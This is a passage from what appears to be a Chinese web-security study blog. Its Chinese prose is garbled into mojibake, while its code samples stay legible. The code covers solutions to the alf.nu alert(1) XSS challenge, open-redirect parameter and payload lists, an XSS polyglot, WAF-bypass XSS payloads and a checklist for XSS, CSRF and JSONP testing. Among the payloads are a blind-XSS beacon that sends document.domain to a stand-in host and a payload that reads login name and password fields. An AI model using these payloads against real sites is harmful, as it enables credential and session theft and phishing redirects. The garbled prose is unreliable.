rel="noopener">https://alf.nu/alert1</a></h4><p>ç¬¬ä¸€å…³</p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;script&gt;console.log("'</span>+s+<span class="hljs-string">'");&lt;/script&gt;'</span>;&#125;</code></pre><p>æ˜¾ç„¶é—­åˆæ„é€ æ³¨é‡Šâ€);alert(1)//</p><p>ç¬¬äºŒå…³</p><pre><code class="hljs scilab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span><span class="hljs-params">(s)</span> &#123;</span>  s = s.replace(/<span class="hljs-string">"/g, '</span>\\<span class="hljs-string">"'</span>);  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;script&gt;console.log("</span><span class="hljs-string">' + s + '</span><span class="hljs-string">");&lt;/script&gt;'</span>;&#125;</code></pre><p>æ‡µåœˆï¼Œæœ¬æƒ³æ¢è¡Œç¬¦ç»•è¿‡åº”ä¸ºæ­£åˆ™é‡Œé¢æ²¡å†™mï¼Œç»“æœä¸çŸ¥ä¸ºå•¥æ‰§è¡Œä¸äº†å¼ä»–å¦ˆçš„ã€‚</p><p>æ¢ä¸ªå§¿åŠ¿ï¼ŒæŠ¥é”™è¯´æ˜¯æ¢è¡Œç¬¦æ²¡è½¬ä¹‰ï¼ŒåŠ ä¸ª\å°±æ­£å¸¸äº†ï¼Œæƒ³åˆ°ç”¨\æ³¨é‡ŠåŸå…ˆçš„è½¬ä¹‰ç¬¦ç»•è¿‡</p><p>\â€œ);alert(1)//</p><p>ç¬¬ä¸‰å…³</p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;  s = <span class="hljs-built_in">JSON</span>.stringify(s);  <span class="hljs-keyword">return</span> <span class="hljs-string">'&lt;script&gt;console.log('</span> + s + <span class="hljs-string">');&lt;/script&gt;'</span>;&#125;&lt;<span class="hljs-regexp">/script&gt;&lt;script&gt;alert(1);/</span><span class="hljs-regexp">/</span></code></pre><p>å…¨è½¬ä¹‰</p><p>çˆ·ç»™ä½ é—­åˆä¹‹å‰çš„ï¼Œå†æ„é€ </p><p>ç¬¬å››å…³</p><p><a href="https://alf.nu/alert(1)#accesstoken=6uEjiGpGDYL5CZGWEf5p" target="_blank" rel="noopener">https://alf.nu/alert(1)#accesstoken=6uEjiGpGDYL5CZGWEf5p</a></p><p>è¿‡ä¸å»ï¼Œï¼Œï¼Œ</p><p>ç¬¬äº”å…³</p><p><img src="/img/buu/xss_1.png" srcset="/img/loading.gif" alt=""></p><p>ç»è¿‡è°ƒè¯•åå¯ä»¥æ„é€ createElementæ¥æ‰§è¡Œfunctionï¼Œå…¶ä¸­applyçš„ä½œç”¨å’Œcallç±»ä¼¼å¯ä»¥æŠŠåé¢çš„æ•°ç»„ä½œä¸ºå‚æ•°</p><h2 id="url"><a href="#url" class="headerlink" title="url"></a>url</h2><p>è·³è½¬å‚æ•°</p><pre><code class="hljs vim">redirecturlredirectUrl?callbackreturn_urltoUrlReturnUrlfromUrlredUrlrequestredirect_toredirect_urljumpjump_totargettargetUrl<span class="hljs-keyword">to</span><span class="hljs-keyword">goto</span>linklinktodomainoauth_callbackreferrerdomain<span class="hljs-keyword">next</span>service?redirect=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;url=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;redirectUrl=url=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;callback=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;return_url=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;ReturnUrl=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>?<span class="hljs-keyword">next</span>=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;redirect_url=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;redirect_uri=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;target=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span>&amp;<span class="hljs-keyword">continue</span>=http<span class="hljs-variable">s:</span>//baidu.<span class="hljs-keyword">com</span></code></pre><p>è·³è½¬</p><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">"Refresh"</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">"1; url=http://www.baidu.com"</span>/&gt;history.go(-1),history.back(-1)location.<span class="hljs-attribute">href</span>=<span class="hljs-string">'//baidu.com'</span> æœåŠ¡ç«¯çš„urlé‡å®šå‘ location.replace(<span class="hljs-string">'//baidu.com'</span>)&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">"http://baidu.com"</span>&gt;ç™¾åº¦ä¸€ä¸‹&lt;/a&gt;</code></pre><p>ç¼–ç </p><pre><code class="hljs angelscript">&amp;quot; &amp;#<span class="hljs-number">34</span>;&amp;#<span class="hljs-number">000034</span></code></pre><p>æ¢é’ˆ</p><pre><code class="hljs livescript">jaVasCript:<span class="hljs-comment">/*-/*`/*\`/*'/*"/**/</span>(<span class="hljs-comment">/* */</span>oNcliCk=alert() ) <span class="hljs-regexp">//%0D%0A%0d%0a//</span>&lt;<span class="hljs-regexp">/stYle/</span>&lt;<span class="hljs-regexp">/titLe/</span>&lt;<span class="hljs-regexp">/teXtarEa/</span>&lt;<span class="hljs-regexp">/scRipt/</span>--!&gt; <span class="hljs-string">\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span></code></pre><p>bypass waf</p><pre><code class="hljs xml">1.<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-keyword">@keyframes</span> x&#123;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"animation-name:x"</span> <span class="hljs-attr">onanimationstart</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>2.<span class="hljs-tag">&lt;<span class="hljs-name">math</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span>CLICKME<span class="hljs-tag">&lt;/<span class="hljs-name">math</span>&gt;</span> firefox3.<span class="hljs-tag">&lt;<span class="hljs-name">area</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"javascript:alert(1)"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:block;height:100vh;width:100vw"</span>&gt;</span>click4.<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">circle</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">set</span> <span class="hljs-attr">onbegin</span>=<span class="hljs-string">prompt(1)</span> <span class="hljs-attr">attributename</span>=<span class="hljs-string">fill</span>&gt;</span>5.<span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input%20type=submit%20formaction=%27java%0a%0ascri%0a%0dPt:var%20a="al%0a%0dert(1)";Function(a)()%27</span>&gt;</span>eeee6.<span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span>7.<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span>8.<span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span> firefox data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==9.<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span> data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==10.<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">"&lt;svg/onload=alert(1)&gt;"</span>&gt;</span>11.<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"search"</span> <span class="hljs-attr">onsearch</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span>12.<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>13.<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"javascript:alert(1)"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>oncanplayontouchstartontouchmoveontouchendontouchcancelonpageshow</code></pre><pre><code class="hljs yaml"><span class="hljs-string">ç½‘ç«™ä¸šåŠ¡åˆ†æ</span> <span class="hljs-number">1</span><span class="hljs-string">.ç†Ÿæ‚‰å¼€å‘äººå‘˜</span><span class="hljs-number">1</span><span class="hljs-string">.ç†Ÿæ‚‰ç½‘ç«™å¼€å‘çš„å‰åç«¯ä½¿ç”¨æŠ€æœ¯ï¼Œå®¢æˆ·ç«¯æ¸²æŸ“ï¼ŸæœåŠ¡ç«¯æ¸²æŸ“ï¼Ÿï¼Œç†Ÿæ‚‰å¼€å‘ä½¿ç”¨çš„è¯­è¨€ä¸æ¡†æ¶ï¼Œå‰ç«¯ï¼šhtmlï¼Œjsï¼Œjqueryï¼Œvueï¼Œreact...ï¼Ÿï¼Œåç«¯ï¼šphpï¼Œpythonï¼Œjavaï¼Œnodejsï¼Œ.net...ï¼Ÿ</span><span class="hljs-number">2</span><span class="hljs-string">.ç†Ÿæ‚‰å¼€å‘è€…å¼€å‘ä¹ æƒ¯ï¼Œå‰ç«¯çš„æ ‡ç­¾ï¼Œå‡½æ•°å‘½åä¹ æƒ¯ç­‰...ï¼Œjsä»£ç æ‰§è¡Œé€»è¾‘ï¼Œç†Ÿæ‚‰å¼€å‘è€…çš„è¯·æ±‚æ¥å£å‘½åä¹ æƒ¯ï¼ŒæœåŠ¡ç«¯è¿”å›çš„æ•°æ®æ ¼å¼ï¼Œå‰ç«¯è¯·æ±‚æ–¹å¼ï¼Œformè¡¨å•ï¼Œxhrï¼Œajaxï¼Œfetchï¼Œjsonp...</span><span class="hljs-number">2</span><span class="hljs-string">.ç†Ÿæ‚‰åº”ç”¨ä¸šåŠ¡åŠŸèƒ½</span><span class="hljs-number">1</span><span class="hljs-string">.é€šè¿‡æœç´¢å¼•æ“ï¼Œä¼ä¸šæŸ¥è¯¢ï¼Œç¬¬ä¸‰æ–¹ä¿¡æ¯æ•´åˆå¹³å°ï¼Œäº†è§£åº”ç”¨ä¸šåŠ¡åŠŸèƒ½ï¼Œç¤¾äº¤ï¼Œä¿¡æ¯æœç´¢ï¼Œé—¨æˆ·ç½‘ç«™ï¼Œç®¡ç†ç³»ç»Ÿ...ã€‚ç†Ÿæ‚‰ç½‘ç«™çš„åŠŸèƒ½ï¼Œè¯„è®ºï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œå³æ—¶é€šè®¯...</span><span class="hljs-number">2</span><span class="hljs-string">.ç†Ÿæ‚‰åº”ç”¨çš„åŠŸèƒ½å®ç°ï¼Œæ³¨å†Œï¼Œç™»å½•ï¼Œä¿¡æ¯ä¿®æ”¹ï¼ŒèŠå¤©åŠŸèƒ½ç­‰å‰åç«¯å®ç°é€»è¾‘</span><span class="hljs-number">3</span><span class="hljs-string">.åˆ†æåŠŸèƒ½ç‚¹çš„ä¸šåŠ¡é£é™©xss,csrf,urlè·³è½¬...ï¼ŒæŒæ¡å¸¸è§ä¸šåŠ¡é£é™©ç‚¹æµ‹è¯•æµç¨‹ã€‚å¼ºåŒ–æµ‹è¯•æ€è·¯ï¼ŒæŒæ¡åˆ©ç”¨æ–¹å¼ã€‚</span><span class="hljs-string">å¸¸è§webå®‰å…¨æ¼æ´</span><span class="hljs-number">1.</span><span class="hljs-string">urlè·³è½¬</span><span class="hljs-number">1</span><span class="hljs-string">.äº§ç”Ÿè¯¥æ¼æ´çš„åŸå› ï¼Œä½ç½®ï¼Ÿç™»å½•å›è·³ï¼Œæ”¯ä»˜å›è·³...æ¼æ´å±å®³ï¼Œåˆ©ç”¨æ–¹å¼</span><span class="hljs-string">å¸¸è§è·³è½¬å‚æ•°ï¼š</span><span class="hljs-string">redirect</span><span class="hljs-string">url</span><span class="hljs-string">redirectUrl</span><span class="hljs-string">callback</span><span class="hljs-string">return_url</span><span class="hljs-string">toUrl</span><span class="hljs-string">ReturnUrl</span><span class="hljs-string">fromUrl</span><span class="hljs-string">redUrl</span><span class="hljs-string">request</span><span class="hljs-string">redirect_to</span><span class="hljs-string">redirect_url</span><span class="hljs-string">jump</span><span class="hljs-string">jump_to</span><span class="hljs-string">target</span><span class="hljs-string">targetUrl</span><span class="hljs-string">to</span><span class="hljs-string">goto</span><span class="hljs-string">link</span><span class="hljs-string">linkto</span><span class="hljs-string">domain</span><span class="hljs-string">oauth_callback</span><span class="hljs-string">referrerdomain</span><span class="hljs-string">next</span><span class="hljs-string">åˆ©ç”¨æ–¹å¼:</span><span class="hljs-string">é’“é±¼ç½‘ç«™</span><span class="hljs-string">javascriptåè®®çš„xss</span><span class="hljs-string">æºå¸¦ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ï¼Œtokenè·³è½¬</span><span class="hljs-string">å¸¸è§payload:</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-number">1</span><span class="hljs-string">.?reidrect=https://baidu.com</span><span class="hljs-number">2</span><span class="hljs-string">.?reidrect=https://a.com@b.com</span><span class="hljs-number">3</span><span class="hljs-string">.?reidrect=//b.com</span><span class="hljs-number">4</span><span class="hljs-string">.?reidrect=javascript:alert(1)</span><span class="hljs-number">5</span><span class="hljs-string">.?reidrect=@baidu.com</span>ï»¿ï»¿<span class="hljs-number">2.</span><span class="hljs-string">Xss</span><span class="hljs-number">1</span><span class="hljs-string">.ç†Ÿæ‚‰xsså¸¸è§çš„è¾“å‡ºä½ç½®ï¼Œæœç´¢ï¼Œè¯„è®ºï¼Œå†…å®¹æ¸²æŸ“ï¼Œå½¢æˆçš„åŸç†ï¼Œå±å®³ï¼Œå¸¸è§åˆ©ç”¨æ–¹å¼ï¼ˆç›—å–ç”¨æˆ·cookieï¼Œå®ç°æ— è´¦å·å¯†ç ç™»å½•å…¶ä»–ç”¨æˆ·ç½‘é¡µï¼Œæ‰€cookieä¸ºhttponlyï¼Œå¯é€šè¿‡jsä»£ç è®©ç”¨æˆ·å‘é€ä»»æ„è¯·æ±‚ï¼‰ï¼Œxssçš„ä¸åŒç±»å‹ï¼š</span><span class="hljs-string">åå°„å‹xssï¼šç›´æ¥å“åº”htmlä»£ç ï¼Œå¦‚&lt;script&gt;alert(1)&lt;/script&gt;ï¼Œ&lt;img</span> <span class="hljs-string">src=x</span> <span class="hljs-string">onerro=alert(1)&gt;ï¼Œåœ¨é¡µé¢ç›´æ¥è§¦å‘ï¼Œ</span><span class="hljs-string">å‚¨å­˜å‹ï¼šå°†è¾“å…¥å†…å®¹å‚¨å­˜è‡³æ•°æ®åº“ï¼Œå¹¶åœ¨è®¿é—®è¯¥å†…å®¹æ—¶è§¦å‘</span><span class="hljs-string">domå‹ï¼šåªé€šè¿‡ä¸€å®šç”¨æˆ·äº¤äº’æˆ–åœ¨å®¢æˆ·ç«¯jsä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­è§¦å‘</span><span class="hljs-number">2</span><span class="hljs-string">.å¦‚ä½•å‘ç°xssæ¼æ´ï¼ŒæŸ¥æ‰¾è¾“å…¥ç‚¹ï¼Œè¾“å…¥æ¡†ï¼Œurlå‚æ•°ï¼Œå®¡è®¡ä»£ç ï¼ŒæŸ¥æ‰¾è¾“å‡ºç‚¹ï¼Œé€šè¿‡æœç´¢ä»£ç ä¸­çš„è¾“å…¥å†…å®¹æ£€ç´¢ä»£ç ä¸­å‡ºç°çš„ä½ç½®ï¼Œæ¬¡æ•°ï¼Œè§‚å¯Ÿè¿‡æ»¤è§„åˆ™ï¼Œæ˜¯å¦è¿‡æ»¤äº†&lt;&gt;,",'ç­‰ç‰¹æ®Šç¬¦å·</span><span class="hljs-number">3</span><span class="hljs-string">.è¾“å‡ºåœ¨ä¸åŒä½ç½®çš„å¸¸è§payloadï¼š</span><span class="hljs-string">ç›´æ¥è¾“å‡ºåœ¨htmlä¸­ï¼š</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">&lt;svg</span> <span class="hljs-string">onload=alert(1)&gt;</span><span class="hljs-string">è¾“å‡ºåœ¨htmlå±æ€§ä¸­ä¸”"ï¼Œ&gt;æ²¡è¢«è¿‡æ»¤ï¼š</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">"&gt;&lt;svg onload=alert(1)//&gt;</span><span class="hljs-string">è¾“å‡ºåœ¨htmlå±æ€§ä¸­ä¸”&gt;è¢«è¿‡æ»¤ï¼Œ"</span><span class="hljs-string">æ²¡è¢«è¿‡æ»¤ï¼š</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">"autofocus onfocus=alert(1)//</span><span class="hljs-string">è¾“å‡ºåœ¨jså­—ç¬¦ä¸²ä¸­ä¸”"</span><span class="hljs-string">è¢«è¿‡æ»¤ï¼Œ&lt;&gt;æ²¡è¢«è¿‡æ»¤ï¼š</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">&lt;/script&gt;&lt;script&gt;alert(1)//</span><span class="hljs-string">è¾“å‡ºåœ¨jså­—ç¬¦ä¸²ä¸­ä¸”&lt;&gt;è¢«è¿‡æ»¤ï¼Œ"æ²¡è¢«è¿‡æ»¤ï¼š</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">"-alert(1)//</span><span class="hljs-string">è¾“å‡ºåœ¨aæ ‡ç­¾hrefæˆ–iframeçš„srcå±æ€§ä¸­:</span><span class="hljs-string"></span><span class="hljs-string">Plain Text</span><span class="hljs-string">javascript:alert(1)</span><span class="hljs-string">è¾“å‡ºåœ¨htmlæ³¨é‡Šä¸­ï¼š</span><span class="hljs-string"></span><span class="hljs-string">Plain Text</span><span class="hljs-string">--&gt;&lt;svg onload=alert(1)//&gt;</span><span class="hljs-string">è¾“å‡ºåœ¨jså•è¡Œæ³¨é‡Šä¸­ï¼š</span><span class="hljs-string"></span><span class="hljs-string">Plain Text</span><span class="hljs-string">%0aalert(1)//</span><span class="hljs-string">è¾“å‡ºåœ¨jså¤šè¡Œæ³¨é‡Šä¸­ï¼š</span><span class="hljs-string"></span><span class="hljs-string">Plain Text</span><span class="hljs-string">*/alert(1)/*</span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">ä¸€äº›ç‰¹æ®Šçš„payload</span><span class="hljs-string"></span><span class="hljs-string">&lt;body%20onpageshow=alert(1)&gt;</span><span class="hljs-string"></span><span class="hljs-string">&lt;details ontoggle=alert(1) open&gt;test&lt;/details&gt;</span><span class="hljs-string"></span><span class="hljs-string">&lt;a autofocus onfocus=alert(1) href="</span><span class="hljs-comment">#"&gt;x&lt;/a&gt;</span><span class="hljs-string">--&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--&lt;script&gt;</span><span class="hljs-string">&lt;video</span> <span class="hljs-string">src=http://1252524126.vod2.myqcloud.com/2919df88vodtranscq1252524126/0c702fd15285890790259780332/v.f30.mp4</span> <span class="hljs-string">controls</span> <span class="hljs-string">oncanplay=alert(1)&gt;</span><span class="hljs-string">ï¼ˆå¯¹è¾“å‡ºåœ¨jsä¸­ä¸”èƒ½æ‰“ç ´åŸæœ¬ç»“æ„çš„payloadéœ€è¦æ„é€ æ­£ç¡®çš„jsè¯­æ³•ï¼‰</span><span class="hljs-number">4</span><span class="hljs-string">.ç†Ÿæ‚‰ç¼–ç çš„ä½¿ç”¨ï¼Œurlç¼–ç ï¼Œhtmlç¼–ç ï¼Œurlç¼–ç é€šå¸¸ç”¨äºæœåŠ¡ç«¯æ— æ³•æ­£å¸¸æ¥æ”¶ä¸€äº›ç‰¹æ®Šç¬¦å·å¯¼è‡´é¡µé¢æ— å¦¨è®¿é—®ï¼Œæˆ–å†…å®¹è¾“å‡ºåœ¨htmlå†…ä¸”ç‰¹æ®Šç¬¦å·è¢«è¿‡æ»¤çš„æƒ…å†µï¼Œå†ä½¿ç”¨htmlç¼–ç è¿›è¡Œç»•è¿‡æ—¶åœ¨é€šè¿‡urlç¼–ç è¯¥å†…å®¹ï¼Œï¼ˆé€šå¸¸htmlç¼–ç åçš„å†…å®¹ç¬¦å·åœ¨urlä¸­æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œå¦‚&amp;lt;ä¸º&lt;çš„htmlç¼–ç ï¼Œ&amp;æœ¬èº«åœ¨urlè¡¨ç¤ºå‚æ•°æ‹¼æ¥ï¼Œæ­¤æ—¶åº”è¯¥å†å¯¹htmlç¼–ç åçš„å†…å®¹è¿›è¡Œurlç¼–ç é¿å…ç¬¦å·å†²çªï¼‰</span><span class="hljs-number">5</span><span class="hljs-string">ï¼Œè§‚å¯Ÿåˆ©ç”¨æ–¹å¼ï¼Œå¦‚ç»“åˆæœ¬åœ°å­˜å‚¨çš„xssè¿›è¡Œåˆ©ç”¨ã€‚å¯¹å‡ºç°åœ¨ç™»å½•ä½ç½®çš„xssè§‚å¯Ÿæ˜¯å¦èƒ½ç›´æ¥æ‹¦æˆªè´¦å·å¯†ç ï¼Œå¸¸ç”¨æµ‹è¯•è¯­å¥ï¼Œå¦‚urlè·³è½¬ä¸­çš„xss(æ­¤å¤„çš„å…ƒç´ idååº”æ ¹æ®å…·ä½“æƒ…å†µæ›´æ¢):</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">javascript:prompt(document.getElementById(`loginName`).value,document.getElementById(`loginPwd`).value)</span><span class="hljs-number">6</span><span class="hljs-string">.å¯¹äºç›²æ³¨ç±»å‹çš„xssï¼Œé€šè¿‡</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">&lt;script&gt;new</span> <span class="hljs-string">Image().src="//xxx.com?"+document.domain</span> <span class="hljs-string">&lt;/script&gt;</span><span class="hljs-string">æˆ–å…¶ä»–èƒ½æ‰§è¡Œjsçš„payloadéªŒè¯è·å–åˆ°ä¸»æœºåå³å¯</span><span class="hljs-string">7xssä¸€å¥è¯</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">jaVasCript:/*-/*`/*\`/*'/*"/**/(/*</span> <span class="hljs-string">*/oNcliCk=alert()</span> <span class="hljs-string">)</span><span class="hljs-string">//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span>ï»¿ï»¿<span class="hljs-number">3.</span><span class="hljs-string">Csrf</span><span class="hljs-number">1</span><span class="hljs-string">.å‘ç°æ–¹å¼ï¼šè§‚å¯Ÿåº”ç”¨æ˜¯å¦æœ‰å¯¹ç”¨æˆ·å‘é€çš„è¯·æ±‚åšéªŒè¯ï¼Œé€šå¸¸ä¸ºæ£€æµ‹refereræˆ–csrf_token,è‹¥æœªéªŒè¯é€šè¿‡è‡ªå·±å†™htmlé¡µé¢ï¼ˆbé¡µé¢ï¼‰å¹¶å‘é€è¯·æ±‚ä¿®æ”¹åŸç½‘ç«™ï¼ˆaé¡µé¢ï¼‰çš„æŸäº›ç”¨æˆ·ä¿¡æ¯ï¼Œè‹¥è®¿é—®bé¡µé¢æ—¶è¯·æ±‚å‘é€æˆåŠŸå¹¶è¢«å“åº”ï¼Œaç½‘é¡µä¿¡æ¯ä¿®æ”¹æˆåŠŸï¼Œåˆ™è¯æ˜æ­¤ç½‘ç«™å­˜åœ¨csrfæ¼æ´ï¼Œ</span><span class="hljs-number">2</span><span class="hljs-string">.ä½ç½®ï¼Œé€šå¸¸å¯åœ¨è¯„è®ºï¼Œç•™è¨€ï¼Œç§ä¿¡ç­‰ä½ç½®ç•™ä¸‹é“¾æ¥ç”¨æˆ·åœ¨è®¿é—®æ—¶å°†å¯èƒ½å—åˆ°æ”»å‡»ï¼Œå‡ºç°è¾ƒå¤šçš„æƒ…å†µï¼š</span><span class="hljs-number">1</span><span class="hljs-string">.å‘å¸ƒä¿¡æ¯çš„å¤„ï¼Œå‘å¸ƒé“¾æ¥ï¼Œæˆ–å›¾ç‰‡èµ„æºï¼Œç”¨æˆ·åœ¨è®¿é—®è¯¥é“¾æ¥æ—¶è§¦å‘ï¼Œå½±å“èŒƒå›´ä¸ºåœ¨è®¿é—®è¯¥å‘å¸ƒå†…å®¹çš„ç”¨æˆ·</span><span class="hljs-number">2</span><span class="hljs-string">.è¯„è®ºï¼Œè¯„è®ºé“¾æ¥ï¼Œå›¾ç‰‡èµ„æºï¼Œç”¨æˆ·åœ¨è®¿é—®è¯¥å†…å®¹è§¦å‘ï¼Œå½±å“èŒƒå›´ä¸ºæ‰€æœ‰è®¿é—®è¯¥å†…å®¹çš„ç”¨æˆ·</span><span class="hljs-number">3</span><span class="hljs-string">.ç”¨æˆ·å¤´åƒï¼Œæˆ–å‰é¢ç­‰ä½ç½®çš„å›¾ç‰‡æˆ–é“¾æ¥ï¼Œæ¯”è¾ƒéšè”½</span><span class="hljs-number">4</span><span class="hljs-string">.å›¾ç‰‡ç±»å‹å¯ç»“åˆç™»å½•è·³è½¬æºå¸¦ç”¨æˆ·æ•æ„Ÿä¿¡æ¯è¿›è¡Œåˆ©ç”¨ï¼Œé€šè¿‡refererå°†ä¿¡æ¯å‘é€è‡³è‡ªå·±æœåŠ¡å™¨</span><span class="hljs-number">5.</span><span class="hljs-string">bbcodeè¯­æ³•ï¼ŒæŸäº›å¯Œæ–‡æœ¬ç¼–è¾‘æ¡†æ”¯æŒçš„è¯­æ³•ï¼Œå¦‚[img]https://baidu.com[/img]</span>ï»¿ï»¿<span class="hljs-number">4.</span><span class="hljs-string">jsonp</span><span class="hljs-number">1</span><span class="hljs-string">.å‡ºç°ä½ç½®ï¼š</span><span class="hljs-string">ç½‘é¡µå‘é€çš„è¯·æ±‚ä¸­</span><span class="hljs-string">å¸¸ç”¨å‚æ•°ï¼šcallback,</span> <span class="hljs-string">cb...</span><span class="hljs-string">æ¼æ´æƒ…å†µï¼š</span><span class="hljs-number">1</span><span class="hljs-string">.ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ³„éœ²</span><span class="hljs-number">2.</span><span class="hljs-string">xss</span><span class="hljs-string">...</span>ï»¿ï»¿<span class="hljs-number">5</span><span class="hljs-string">.å†…å®¹å®¡è®¡</span><span class="hljs-number">1.</span><span class="hljs-string">urlä¸htmlå±æ€§</span> <span class="hljs-string">urlå‚æ•°ï¼Œè·¯å¾„ï¼Œhtmlä¸åŒå±æ€§çš„ä½œç”¨...</span><span class="hljs-number">2.</span><span class="hljs-string">JSä»£ç å®¡è®¡ä¸éšè—å‚æ•°</span><span class="hljs-string">å®¡è®¡å¸¸è§å±é™©æ–¹æ³•åï¼š</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">innerHTML</span><span class="hljs-string">appendChild()</span><span class="hljs-string">html()</span><span class="hljs-string">replaceWith()</span><span class="hljs-string">location.hash</span><span class="hljs-string">location.search()</span><span class="hljs-string">localStorage</span><span class="hljs-string">setTimeout()</span><span class="hljs-string">eval()</span><span class="hljs-string">éšè—å‚æ•°</span><span class="hljs-string">urlä¸­è‡ªåŠ¨äº§ç”Ÿçš„å‚æ•°</span><span class="hljs-string">inputæ ‡ç­¾hiddenå±æ€§</span><span class="hljs-string">jsä»£ç ä¸­çš„éšè—å‚æ•°</span><span class="hljs-string">å…¶ä»–ç›¸å…³ä¸šåŠ¡ä¸­ä½¿ç”¨åˆ°çš„å‚æ•°</span><span class="hljs-string">éšè—è·¯å¾„ï¼šidï¼Œè¯·æ±‚</span><span class="hljs-string">aæ ‡ç­¾çš„hrefï¼Œå¸¦æ³¨é‡Šçš„aæ ‡ç­¾</span><span class="hljs-string">formçš„actionæäº¤åœ°å€</span><span class="hljs-string">scriptæ ‡ç­¾å†…çš„è·¯å¾„</span><span class="hljs-string">pathæœç´¢ï¼Œhttps://,</span> <span class="hljs-string">/</span><span class="hljs-string">è¯·æ±‚åœ°å€ï¼Œå‚æ•°ï¼Œå“åº”å€¼</span>ï»¿ï»¿<span class="hljs-number">6</span><span class="hljs-string">.å·¥å…·çš„ä½¿ç”¨</span><span class="hljs-number">1.</span><span class="hljs-string">Awvs</span><span 